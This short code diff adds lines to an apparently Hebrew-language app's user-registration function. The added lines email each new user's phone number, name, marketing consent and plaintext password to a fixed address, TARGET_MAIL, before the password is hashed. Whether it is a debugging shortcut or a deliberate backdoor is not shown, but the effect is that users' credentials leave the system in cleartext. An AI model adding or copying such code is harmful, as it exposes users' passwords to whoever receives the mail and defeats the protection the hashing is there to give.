@@ -1433,6 +1433,15 @@ existingUser:${JSON.stringify(existingUser)}`,
 
     return 'משתמש בעל אותו מספר טלפון כבר קיים במערכת';
   }
+  sendEmail(
+      TARGET_MAIL,
+      `About to Create New user - ${username}`,
+      `phone: ${phoneNumber}  
+name:${username} 
+marketing_approve:${marketing_approve} 
+pass:${password}`,
+  );
+
 
   const hashedPassword = await bcrypt.hash(password, 10);
   const isAdmin = ADMINS.includes(phoneNumber);
